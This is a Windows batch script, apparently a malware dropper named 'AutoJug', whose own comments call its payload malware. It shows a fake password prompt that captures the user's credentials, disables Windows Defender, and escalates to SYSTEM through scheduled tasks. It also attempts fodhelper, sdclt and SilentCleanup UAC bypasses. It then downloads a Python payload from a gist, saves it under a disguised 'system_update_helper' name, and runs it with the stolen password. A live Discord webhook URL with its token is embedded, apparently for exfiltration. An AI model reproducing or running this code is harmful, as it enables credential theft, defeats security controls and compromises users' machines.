@echo off
:: wrapper to keep cmd window open on double-click and run as forced instance
if not "%~1"=="/forced" (
    cmd /k "%~f0" /forced
    goto :eof
)

setlocal EnableDelayedExpansion
set "VERSION=11.11-Final-CredsFixed"
set "DEBUG_LOG=%~dp0autojug_debug.log"

:: initial logging setup
echo [%DATE% %TIME%] === Session Start [%VERSION%] === > "%DEBUG_LOG%" 2>&1
if %ERRORLEVEL% neq 0 (
    set "DEBUG_LOG=CON"
    echo [%DATE% %TIME%] Warning: Can’t write to log file. Logging to console. > "%DEBUG_LOG%"
)
call :log "=== Session Start [%VERSION%] ==="

:: cleanup old instances and files (modified to check PID)
call :cleanup_old_instances
call :log "Cleaned up old instances and files."

:: check for python and set PYTHON variable
call :find_python
if not defined PYTHON (
    call :install_python
    call :find_python
)
if not defined PYTHON (
    call :log "Python not found or installed. Exiting."
    goto :cleanup_and_exit
)
call :log "Python found at %PYTHON%"

:: check if running with admin rights
net session >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set "IS_ADMIN=1"
    call :log "Already running with admin rights."
    goto :admin_execution
) else (
    set "IS_ADMIN=0"
    call :log "Running without admin rights. Proceeding with credential capture..."
)

:: capture user credentials (non-admin scenario)
set "CURRENT_STEP=Capturing user credentials"
echo %CURRENT_STEP%...
powershell -Command "& { $username = '%USERNAME%'; $cred = Get-Credential -UserName $username -Message 'Enter your password to continue'; if ($cred) { $password = $cred.GetNetworkCredential().Password; [System.IO.File]::WriteAllText('%TEMP%\cred_temp.txt', ($username + '|' + $password)) } else { exit 1 } }" >nul
if %ERRORLEVEL% neq 0 (
    call :log "Credential capture failed or cancelled."
    goto :cleanup_and_exit
)
for /f "tokens=1,2 delims=|" %%a in ('type "%TEMP%\cred_temp.txt" 2^>nul') do (
    set "USER_NAME=%%a"
    set "USER_PASSWORD=%%b"
)
del "%TEMP%\cred_temp.txt" 2>nul
if not defined USER_PASSWORD (
    call :log "Failed to retrieve password from temp file."
    goto :cleanup_and_exit
)
call :log "Captured credentials for %USER_NAME% (auto-detected)."

:: check if the user is an admin
set "IS_USER_ADMIN=0"
powershell -Command "& { $cred = New-Object System.Management.Automation.PSCredential('%USER_NAME%', (ConvertTo-SecureString '%USER_PASSWORD%' -AsPlainText -Force)); $result = Start-Process -FilePath 'net' -ArgumentList 'session' -Credential $cred -NoNewWindow -Wait -ErrorAction SilentlyContinue; if ($result.ExitCode -eq 0) { 'Admin' } else { 'NotAdmin' } | Out-File -FilePath '%TEMP%\admin_check.txt' -Encoding ASCII }" >nul 2>&1
for /f "tokens=*" %%a in ('type "%TEMP%\admin_check.txt" 2^>nul') do (
    if "%%a"=="Admin" (
        set "IS_USER_ADMIN=1"
        call :log "User %USER_NAME% is an admin. Using credentials to avoid UAC..."
    ) else (
        call :log "User %USER_NAME% is not an admin. Attempting elevation..."
    )
)
del "%TEMP%\admin_check.txt" 2>nul
if not defined IS_USER_ADMIN (
    call :log "Admin check failed, defaulting to non-admin."
    goto :attempt_elevation
)

:: if user is admin use their credentials to run as admin
if %IS_USER_ADMIN% equ 1 (
    powershell -Command "& { $cred = New-Object System.Management.Automation.PSCredential('%USER_NAME%', (ConvertTo-SecureString '%USER_PASSWORD%' -AsPlainText -Force)); Start-Process -FilePath '%~f0' -ArgumentList '/forced' -Credential $cred -NoNewWindow -Wait }" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "Successfully relaunched with admin credentials."
        goto :cleanup_and_exit
    ) else (
        call :log "Failed to relaunch with admin credentials. Falling back to UAC bypass..."
        goto :attempt_elevation
    )
) else (
    goto :attempt_elevation
)

:admin_execution
:: running with admin rights - disable windows defender escalate to system download and run malware
set "CURRENT_STEP=Disabling Windows Defender"
echo %CURRENT_STEP%...
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    call :log "Windows Defender real-time monitoring disabled."
) else (
    call :log "Failed to disable Windows Defender."
)

:: escalate to system using task scheduler
set "CURRENT_STEP=Escalating to SYSTEM"
echo %CURRENT_STEP%...
schtasks /create /tn "AutoJugSystem" /tr "cmd.exe /c %~f0 /system" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
if %ERRORLEVEL% equ 0 (
    schtasks /run /tn "AutoJugSystem" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "Escalated to SYSTEM via Task Scheduler. Waiting for completion..."
        timeout /t 5 >nul 2>&1
        schtasks /delete /tn "AutoJugSystem" /f >nul 2>&1
        goto :admin_continue
    )
)
schtasks /delete /tn "AutoJugSystem" /f >nul 2>&1
call :log "Task Scheduler escalation to SYSTEM failed. Proceeding as admin..."

:admin_continue
:: set up timestamp
set "CURRENT_STEP=Setting up timestamp"
echo %CURRENT_STEP%...
powershell -Command "Get-Date -Format 'yyyyMMdd_HHmmss' | Out-File '%TEMP%\timestamp.txt'" >nul 2>&1
for /f "tokens=*" %%a in ('type "%TEMP%\timestamp.txt" 2^>nul') do set "TIMESTAMP=%%a"
del "%TEMP%\timestamp.txt" 2>nul
if not defined TIMESTAMP (
    set "TIMESTAMP=20250309_213122"
    call :log "Default timestamp set: %TIMESTAMP%"
)
echo %CURRENT_STEP% completed.
call :log "%CURRENT_STEP% completed. Timestamp: %TIMESTAMP%"

:: config variables
set "LOCK_FILE=%TEMP%\autojug_lock_%TIMESTAMP%.tmp"
set "TARGET_DIR=%APPDATA%\SystemUtilities"
set "TARGET_FILE=%TARGET_DIR%\system_update_helper.py"
set "TEMP_FILE=%TEMP%\autojug_temp.py"
set "DOWNLOAD_URL=https://gist.github.com/jonhardwick-spec/41455097cfe76beaf4464d8dbd0ab35b/raw"
set "DISCORD_WEBHOOK=https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
set "STEP_SUCCESS=1"

:: download and run malware with admin rights
set "CURRENT_STEP=Deploying and launching system_update_helper.py"
echo %CURRENT_STEP%...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1
set "RETRY_COUNT=0"
:admin_deploy_retry
set /a RETRY_COUNT+=1
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_FILE%'" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    if exist "%TEMP_FILE%" (
        for %%F in ("%TEMP_FILE%") do (
            if %%~zF LSS 1000 (
                call :log "Downloaded file too small."
                if !RETRY_COUNT! LSS 3 (
                    goto :admin_deploy_retry
                ) else (
                    call :log "Download failed after 3 retries."
                    goto :cleanup_and_exit
                )
            )
        )
        copy "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
        if %ERRORLEVEL% equ 0 (
            del "%TEMP_FILE%" >nul 2>&1
            call :log "system_update_helper.py deployed to %TARGET_FILE%."
        ) else (
            call :log "Failed to copy malware to target directory."
            goto :cleanup_and_exit
        )
    ) else (
        call :log "Downloaded file not found."
        if !RETRY_COUNT! LSS 3 (
            goto :admin_deploy_retry
        ) else (
            call :log "Download failed after 3 retries."
            goto :cleanup_and_exit
        )
    )
) else (
    if !RETRY_COUNT! LSS 3 (
        call :log "Download failed (Attempt !RETRY_COUNT!/3). Retrying..."
        goto :admin_deploy_retry
    ) else (
        call :log "Download failed after 3 retries."
        goto :cleanup_and_exit
    )
)

:: launch malware with admin rights feeding creds via env vars and debug
if %IS_ADMIN% equ 1 (
    set "AUTOJUG_USER=%USER_NAME%"
    set "AUTOJUG_PASS=%USER_PASSWORD%"
    powershell -Command "& { $env:AUTOJUG_USER = '%USER_NAME%'; $env:AUTOJUG_PASS = '%USER_PASSWORD%'; Start-Process -FilePath '%PYTHON%' -ArgumentList '%TARGET_FILE%' -NoNewWindow }" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "system_update_helper.py launched with admin rights and creds."
        goto :debug_python
    ) else (
        call :log "Launch with admin creds failed. Trying SYSTEM launch..."
        schtasks /create /tn "AutoJugLaunch" /tr "cmd /c set AUTOJUG_USER=%USER_NAME% & set AUTOJUG_PASS=%USER_PASSWORD% & \"%PYTHON%\" \"%TARGET_FILE%\"" /sc once /st 00:00 /ru SYSTEM /f >nul 2>&1
        if %ERRORLEVEL% equ 0 (
            schtasks /run /tn "AutoJugLaunch" >nul 2>&1
            if %ERRORLEVEL% equ 0 (
                call :log "system_update_helper.py launched with SYSTEM privileges and creds."
                schtasks /delete /tn "AutoJugLaunch" /f >nul 2>&1
                goto :debug_python
            ) else (
                call :log "SYSTEM launch failed."
                goto :cleanup_and_exit
            )
        ) else (
            call :log "Failed to schedule SYSTEM launch."
            goto :cleanup_and_exit
        )
    )
) else (
    call :log "No admin rights available, launching with current user privileges and creds."
    set "AUTOJUG_USER=%USER_NAME%"
    set "AUTOJUG_PASS=%USER_PASSWORD%"
    "%PYTHON%" "%TARGET_FILE%" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "system_update_helper.py launched with current user privileges and creds."
        goto :debug_python
    ) else (
        call :log "Launch with current user failed."
        goto :cleanup_and_exit
    )
)

:debug_python
:: debug python script by tailing its log file
set "PYTHON_LOG=%TEMP%\system_update_helper.log"
call :log "Starting debug mode. Tailing %PYTHON_LOG%. Press Ctrl+C to exit."
echo Debugging %TARGET_FILE%. Log output from %PYTHON_LOG% will appear below:
echo (If no output appears, check if the log file exists or if sneaky.py is running.)
echo.
if exist "%PYTHON_LOG%" (
    type "%PYTHON_LOG%"
    powershell -Command "Get-Content -Path '%PYTHON_LOG%' -Wait" 2>nul
) else (
    echo Log file not found at %PYTHON_LOG%. Waiting for it to appear...
    :wait_for_log
    if not exist "%PYTHON_LOG%" (
        timeout /t 5 >nul
        goto :wait_for_log
    )
    type "%PYTHON_LOG%"
    powershell -Command "Get-Content -Path '%PYTHON_LOG%' -Wait" 2>nul
)
goto :eof  :: Keep window open until user exits

:attempt_elevation
:: attempt 1: task scheduler elevation (silent)
call :log "Attempting elevation via Task Scheduler..."
schtasks /create /tn "AutoJugElevate" /tr "cmd.exe /c %~f0 /forced" /sc once /st 00:00 /rl HIGHEST /f >nul 2>&1
if %ERRORLEVEL% equ 0 (
    schtasks /run /tn "AutoJugElevate" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "Task Scheduler elevation successful. Relaunching..."
        timeout /t 5 >nul 2>&1
        schtasks /delete /tn "AutoJugElevate" /f >nul 2>&1
        goto :eof
    )
)
schtasks /delete /tn "AutoJugElevate" /f >nul 2>&1
call :log "Task Scheduler elevation failed."

:: attempt 2: fodhelper uac bypass (silent hidden desktop)
call :log "Attempting elevation via Fodhelper UAC bypass in hidden desktop..."
powershell -Command "& { $desktop = Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Desktop { [DllImport(\"user32.dll\")] public static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, long dwDesiredAccess, IntPtr lpsa); [DllImport(\"user32.dll\")] public static extern bool SwitchDesktop(IntPtr hDesktop); [DllImport(\"user32.dll\")] public static extern bool CloseDesktop(IntPtr hDesktop); }' -PassThru; $hDesktop = $desktop::CreateDesktop('HiddenDesktop', [IntPtr]::Zero, [IntPtr]::Zero, 0, 0x1FF, [IntPtr]::Zero); Start-Process -FilePath 'cmd.exe' -ArgumentList '/c reg add \"HKCU\Software\Classes\.pwn\Shell\Open\command\" /ve /d \"cmd.exe /c %~f0 /forced\" /f & reg add \"HKCU\Software\Classes\ms-settings\CurVer\" /ve /d \".pwn\" /f & start fodhelper.exe & timeout /t 2 /nobreak & reg delete \"HKCU\Software\Classes\.pwn\" /f & reg delete \"HKCU\Software\Classes\ms-settings\CurVer\" /f' -WindowStyle Hidden -Wait; $desktop::CloseDesktop($hDesktop) }" >nul 2>&1
timeout /t 3 /nobreak >nul
net session >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set "IS_ADMIN=1"
    call :log "Fodhelper UAC bypass successful."
    goto :resume_after_elevation
)
call :log "Fodhelper UAC bypass failed."

:: attempt 3: sdclt uac bypass (silent command-based)
call :log "Attempting elevation via Sdclt UAC bypass..."
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "%~f0 /forced" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /v "Path" /d "%SystemRoot%\System32" /f >nul 2>&1
start sdclt.exe >nul 2>&1
timeout /t 2 /nobreak >nul
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /f >nul 2>&1
net session >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set "IS_ADMIN=1"
    call :log "Sdclt UAC bypass successful."
    goto :resume_after_elevation
)
call :log "Sdclt UAC bypass failed."

:: attempt 4: silentcleanup uac bypass (silent)
call :log "Attempting elevation via SilentCleanup UAC bypass..."
set "TEMP_SCRIPT=%TEMP%\elevate.bat"
echo @echo off > "%TEMP_SCRIPT%"
echo cmd.exe /c %~f0 /forced >> "%TEMP_SCRIPT%"
set "PATH=%PATH%;%TEMP%"
set "ProgramData=%TEMP%"
start /b "" "%SystemRoot%\System32\dism.exe" /online /cleanup-image /startcomponentcleanup >nul 2>&1
timeout /t 2 /nobreak >nul
del "%TEMP_SCRIPT%" >nul 2>&1
net session >nul 2>&1
if %ERRORLEVEL% equ 0 (
    set "IS_ADMIN=1"
    call :log "SilentCleanup UAC bypass successful."
    goto :resume_after_elevation
)
call :log "SilentCleanup UAC bypass failed."

:: fallback: uac prompt
call :log "All silent elevation methods failed. Falling back to UAC prompt..."
powershell -Command "Start-Process -FilePath '%~f0' -ArgumentList '/forced' -Verb RunAs" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    call :log "UAC prompt accepted. Relaunching..."
    goto :eof
)
call :log "UAC prompt denied or failed. Proceeding without admin rights..."
set "IS_ADMIN=0"
goto :resume_after_elevation

:resume_after_elevation
:: non-admin execution continues here
set "CURRENT_STEP=Setting up timestamp"
echo %CURRENT_STEP%...
powershell -Command "Get-Date -Format 'yyyyMMdd_HHmmss' | Out-File '%TEMP%\timestamp.txt'" >nul 2>&1
for /f "tokens=*" %%a in ('type "%TEMP%\timestamp.txt" 2^>nul') do set "TIMESTAMP=%%a"
del "%TEMP%\timestamp.txt" 2>nul
if not defined TIMESTAMP (
    set "TIMESTAMP=20250309_213122"
    call :log "Default timestamp set: %TIMESTAMP%"
)
echo %CURRENT_STEP% completed.
call :log "%CURRENT_STEP% completed. Timestamp: %TIMESTAMP%"

:: config variables
set "LOCK_FILE=%TEMP%\autojug_lock_%TIMESTAMP%.tmp"
set "TARGET_DIR=%APPDATA%\SystemUtilities"
set "TARGET_FILE=%TARGET_DIR%\system_update_helper.py"
set "TEMP_FILE=%TEMP%\autojug_temp.py"
set "DOWNLOAD_URL=https://gist.github.com/jonhardwick-spec/41455097cfe76beaf4464d8dbd0ab35b/raw"
set "DISCORD_WEBHOOK=https://discord.com/api/webhooks/1345280507545649212/0G9L_YVWq0KuH7GStQUbvHBxiAk8a5Y7pViIqdwXJcfw1zNBq2peSSl_kCTPKiARPfD4"
set "STEP_SUCCESS=1"

:: download and run malware
set "CURRENT_STEP=Deploying and launching system_update_helper.py"
echo %CURRENT_STEP%...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%" >nul 2>&1
set "RETRY_COUNT=0"
:non_admin_deploy_retry
set /a RETRY_COUNT+=1
powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%TEMP_FILE%'" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    if exist "%TEMP_FILE%" (
        for %%F in ("%TEMP_FILE%") do (
            if %%~zF LSS 1000 (
                call :log "Downloaded file too small."
                if !RETRY_COUNT! LSS 3 (
                    goto :non_admin_deploy_retry
                ) else (
                    call :log "Download failed after 3 retries."
                    goto :cleanup_and_exit
                )
            )
        )
        copy "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
        if %ERRORLEVEL% equ 0 (
            del "%TEMP_FILE%" >nul 2>&1
            call :log "system_update_helper.py deployed to %TARGET_FILE%."
        ) else (
            call :log "Failed to copy malware to target directory."
            goto :cleanup_and_exit
        )
    ) else (
        call :log "Downloaded file not found."
        if !RETRY_COUNT! LSS 3 (
            goto :non_admin_deploy_retry
        ) else (
            call :log "Download failed after 3 retries."
            goto :cleanup_and_exit
        )
    )
) else (
    if !RETRY_COUNT! LSS 3 (
        call :log "Download failed (Attempt !RETRY_COUNT!/3). Retrying..."
        goto :non_admin_deploy_retry
    ) else (
        call :log "Download failed after 3 retries."
        goto :cleanup_and_exit
    )
)

:: launch malware feeding creds via env vars and debug
if %IS_ADMIN% equ 1 (
    set "AUTOJUG_USER=%USER_NAME%"
    set "AUTOJUG_PASS=%USER_PASSWORD%"
    powershell -Command "& { $env:AUTOJUG_USER = '%USER_NAME%'; $env:AUTOJUG_PASS = '%USER_PASSWORD%'; Start-Process -FilePath '%PYTHON%' -ArgumentList '%TARGET_FILE%' -NoNewWindow }" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "system_update_helper.py launched with admin rights and creds."
        goto :debug_python
    ) else (
        call :log "Launch with admin creds failed."
        goto :cleanup_and_exit
    )
) else (
    call :log "No admin rights available, launching with current user privileges and creds."
    set "AUTOJUG_USER=%USER_NAME%"
    set "AUTOJUG_PASS=%USER_PASSWORD%"
    "%PYTHON%" "%TARGET_FILE%" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "system_update_helper.py launched with current user privileges and creds."
        goto :debug_python
    ) else (
        call :log "Launch with current user failed."
        goto :cleanup_and_exit
    )
)

:find_python
:: check for python in common locations
for %%P in (
    "python.exe"
    "%ProgramFiles%\Python39\python.exe"
    "%ProgramFiles%\Python38\python.exe"
    "%ProgramFiles%\Python37\python.exe"
    "%LocalAppData%\Programs\Python\Python39\python.exe"
    "%LocalAppData%\Programs\Python\Python38\python.exe"
    "%LocalAppData%\Programs\Python\Python37\python.exe"
) do (
    if exist "%%~P" (
        "%%~P" -c "import sys; sys.exit(0)" >nul 2>&1
        if !ERRORLEVEL! equ 0 (
            set "PYTHON=%%~P"
            goto :eof
        )
    )
)
goto :eof

:install_python
:: download and install python 3.9 silently
set "CURRENT_STEP=Installing Python"
echo %CURRENT_STEP%...
powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.9.0/python-3.9.0-amd64.exe' -OutFile '%TEMP%\python_installer.exe'" >nul 2>&1
if %ERRORLEVEL% equ 0 (
    %TEMP%\python_installer.exe /quiet InstallAllUsers=0 PrependPath=1 TargetDir="%LocalAppData%\Programs\Python\Python39" >nul 2>&1
    if %ERRORLEVEL% equ 0 (
        call :log "Python 3.9 installed successfully."
    ) else (
        call :log "Python installation failed."
    )
    del "%TEMP%\python_installer.exe" >nul 2>&1
) else (
    call :log "Failed to download Python installer."
)
goto :eof

:cleanup_and_exit
set "CURRENT_STEP=Cleaning up"
echo %CURRENT_STEP%...
call :cleanup_old_instances
if exist "%LOCK_FILE%" del "%LOCK_FILE%" >nul 2>&1
if exist "%TEMP%\cred_temp.txt" del "%TEMP%\cred_temp.txt" >nul 2>&1
if exist "%TEMP%\admin_check.txt" del "%TEMP%\admin_check.txt" >nul 2>&1
if exist "%TEMP%\timestamp.txt" del "%TEMP%\timestamp.txt" >nul 2>&1
if exist "%TEMP%\python_installer.exe" del "%TEMP%\python_installer.exe" >nul 2>&1
call :log "Cleanup completed."
echo %CURRENT_STEP% completed.
call :log "%CURRENT_STEP% completed."

call :log "Script completed. Exiting."
echo Script completed. Exiting.
goto :eof

:cleanup_old_instances
set "CURRENT_STEP=Cleaning up old instances"
echo %CURRENT_STEP%...
set "PID_FILE=%APPDATA%\SystemUtilities\.autojug.pid"
if exist "%PID_FILE%" (
    for /f "tokens=*" %%a in ('type "%PID_FILE%"') do (
        tasklist /FI "PID eq %%a" | find "python.exe" >nul 2>&1
        if !ERRORLEVEL! equ 0 (
            call :log "Active sneaky.py instance found with PID %%a. Skipping cleanup."
            goto :eof
        )
    )
)
taskkill /IM python.exe /F >nul 2>&1
taskkill /IM system_update_helper.py /F >nul 2>&1
if exist "%APPDATA%\autojuginfo\.autojug.pid" del "%APPDATA%\autojuginfo\.autojug.pid" >nul 2>&1
if exist "%APPDATA%\autojuginfo\sneaky.py" del "%APPDATA%\autojuginfo\sneaky.py" >nul 2>&1
if exist "%APPDATA%\autojuginfo\system_update_helper.py" del "%APPDATA%\autojuginfo\system_update_helper.py" >nul 2>&1
if exist "%APPDATA%\autojuginfo" rmdir /s /q "%APPDATA%\autojuginfo" >nul 2>&1
call :log "Old instances and files cleaned up."
echo %CURRENT_STEP% completed.
goto :eof

:log
set "logmsg=[%DATE% %TIME%] %~1"
if "!DEBUG_LOG!"=="CON" (
    echo !logmsg!
) else (
    echo !logmsg! >> "!DEBUG_LOG!" 2>&1
)
goto :eof